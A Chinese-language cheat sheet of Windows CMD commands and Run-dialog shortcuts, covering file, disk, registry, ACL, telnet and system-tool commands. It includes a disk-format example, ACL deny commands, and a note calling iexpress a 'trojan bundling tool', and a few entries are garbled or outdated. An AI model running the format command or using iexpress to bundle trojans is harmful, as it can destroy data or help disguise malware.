
echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中

findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello

find 文件名 查找某文件

title 标题名字 更改CMD窗口标题名字

color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白

prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )

ver 在DOS窗口下显示版本信息

winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）

format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS

md　目录名 创建目录

replace 源文件　要替换文件的目录 替换文件

ren 原文件名　新文件名 重命名文件名

tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称

type 文件名 显示文本文件的内容

more 文件名 逐屏显示输出文件

doskey 要锁定的命令=字符

doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=

taskmgr 调出任务管理器

chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误

tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口

exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe

path 路径可执行文件的文件名 为可执行文件设置一个路径。

cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?

regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；

regedit /e 注册表文件名 导出注册表

cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。

cacls 文件名 查看文件的访问用户权限列表

REM 文本内容 在批处理文件中添加注解

netsh 查看或更改本地网络配置情况

作者：wh_
链接：https://www.jianshu.com/p/2761c8c51fab
来源：简书
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。



　　1.calc：启动计算器

　　2.appwiz.cpl：程序和功能

　　3.certmgr.msc：证书管理实用程序

　　4.charmap：启动字符映射表

　　5.chkdsk.exe：Chkdsk磁盘检查(管理员身份运行命令提示符)

　　6.cleanmgr: 打开磁盘清理工具

　　7.cliconfg：SQL SERVER 客户端网络实用工具

　　8.cmstp：连接管理器配置文件安装程序

　　9.cmd.exe：CMD命令提示符

　　10.自动关机命令

　　Shutdown -s -t 600：表示600秒后自动关机

　　shutdown -a ：可取消定时关机

　　Shutdown -r -t 600：表示600秒后自动重启

　　rundll32 user32.dll,LockWorkStation：表示锁定计算机

　　11.colorcpl：颜色管理，配置显示器和打印机等中的色彩

　　12.CompMgmtLauncher：计算机管理

　　13.compmgmt.msc：计算机管理

　　14.credwiz：备份或还原储存的用户名和密码

　　15.comexp.msc：打开系统组件服务

　　16.control：控制面版

　　17.dcomcnfg：打开系统组件服务

　　18.Dccw：显示颜色校准

　　19.devmgmt.msc：设备管理器

　　20.desk.cpl：屏幕分辨率

　　21.dfrgui：优化驱动器 Windows 7→dfrg.msc：磁盘碎片整理程序

　　22.dialer：电话拨号程序

　　23.diskmgmt.msc：磁盘管理

　　24.dvdplay：DVD播放器

　　25.dxdiag：检查DirectX信息

　　26.eudcedit：造字程序

　　27.eventvwr：事件查看器

　　28.explorer：打开资源管理器

　　29.Firewall.cpl：Windows防火墙

　　30.FXSCOVER：传真封面编辑器

　　31.fsmgmt.msc：共享文件夹管理器

　　32.gpedit.msc：组策略

　　33.hdwwiz.cpl：设备管理器

　　34.inetcpl.cpl：Internet属性

　　35.intl.cpl：区域

　　36.iexpress：木马捆绑工具，系统自带

　　37.joy.cpl：游戏控制器

　　38.logoff：注销命令

　　39.lusrmgr.msc：本地用户和组

　　40.lpksetup：语言包安装/删除向导，安装向导会提示下载语言包

　　41.lusrmgr.msc：本机用户和组

　　42.main.cpl：鼠标属性

　　43.mmsys.cpl：声音

　　44.magnify：放大镜实用程序

　　45.mem.exe：显示内存使用情况(如果直接运行无效，可以先管理员身份运行命令提示符，在命令提示符里输入mem.exe>d:a.txt 
即可打开d盘查看a.txt，里面的就是内存使用情况了。当然什么盘什么文件名可自己决定。)

　　46.MdSched:Windows内存诊断程序

　　47.mmc：打开控制台

　　48.mobsync：同步命令

　　49.mplayer2：简易widnows media player

　　50.Msconfig.exe：系统配置实用程序

　　51.msdt：微软支持诊断工具

　　52.msinfo32：系统信息

　　53.mspaint：画图

　　54.Msra：Windows远程协助

　　55.mstsc：远程桌面连接

　　56.NAPCLCFG.MSC：客户端配置

　　57.ncpa.cpl：网络连接

　　58.narrator：屏幕“讲述人”

　　59.Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项

　　60.netstat : an(TC)命令检查接口

　　61.notepad：打开记事本

　　62.Nslookup：IP地址侦测器

　　63.odbcad32：ODBC数据源管理器

　　64.OptionalFeatures：打开“打开或关闭Windows功能”对话框

　　65.osk：打开屏幕键盘

　　66.perfmon.msc：计算机性能监测器

　　67.perfmon：计算机性能监测器

　　68.PowerShell：提供强大远程处理能力

　　69.printmanagement.msc：打印管理

　　70.powercfg.cpl：电源选项

　　71.psr：问题步骤记录器

　　72.Rasphone：网络连接

　　73.Recdisc：创建系统修复光盘

　　74.Resmon：资源监视器

　　75.Rstrui：系统还原

　　76.regedit.exe：注册表

　　77.regedt32：注册表编辑器

　　78.rsop.msc：组策略结果集

　　79.sdclt：备份状态与配置，就是查看系统是否已备份

　　80.secpol.msc：本地安全策略

　　81.services.msc：本地服务设置

　　82.sfc /scannow：扫描错误并复原/windows文件保护

　　83.sfc.exe：系统文件检查器

　　84.shrpubw：创建共享文件夹

　　85.sigverif：文件签名验证程序

　　86.slui：Windows激活，查看系统激活信息

　　87.slmgr.vbs -dlv ：显示详细的许可证信息

　　88.snippingtool：截图工具，支持无规则截图

　　89.soundrecorder：录音机，没有录音时间的限制

　　90.StikyNot：便笺

　　91.sysdm.cpl：系统属性

　　92.sysedit：系统配置编辑器

　　93.syskey：系统加密，一旦加密就不能解开，保护系统的双重密码

　　94.taskmgr：任务管理器(旧版)

　　95.TM任务管理器(新版)

　　96.taskschd.msc：任务计划程序

　　97.timedate.cpl：日期和时间

　　98.UserAccountControlSettings用户账户控制设置

　　99.utilman：辅助工具管理器

　　100.wf.msc：高级安全Windows防火墙

　　101.WFS：Windows传真和扫描

　　102.wiaacmgr：扫描仪和照相机向导

　　103.winver：关于Windows

　　104.wmimgmt.msc：打开windows管理体系结构(WMI)

　　105.write：写字板

　　106.wscui.cpl：操作中心

　　107.wuapp：Windows更新

　　108.wscript：windows脚本宿主设置










